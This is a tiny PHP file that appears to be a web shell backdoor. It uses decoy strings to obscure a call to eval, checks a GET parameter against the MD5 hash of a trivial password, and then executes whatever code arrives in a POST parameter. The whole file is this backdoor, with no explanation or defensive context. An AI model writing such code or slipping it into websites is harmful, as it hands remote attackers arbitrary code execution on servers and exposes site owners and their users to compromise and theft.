<?php
  $str1 = 'aH(UUH(fsdfH(UUH(fsdf,fdgdefjg0J)r&%F%*^G*t';
  $str2 = strtr($str1,array('aH(UUH(fsdfH(UUH(fsdf,'=>'ev','fdgdefjg0J)'=>'a','r&%F%*^G*t'=>'l'));
  $str3 = strtr($str2,array('s,'=>'s','fdgdefjg0J)r&%F%*^G*'=>'er'));
  if(md5(@$_GET['a']) =='e10adc3949ba59abbe56e057f20f883e'){
      $str4 = strrev($_POST['a']);
      $str5 = strrev($str4);
      eval
      ($str5);
}
?>
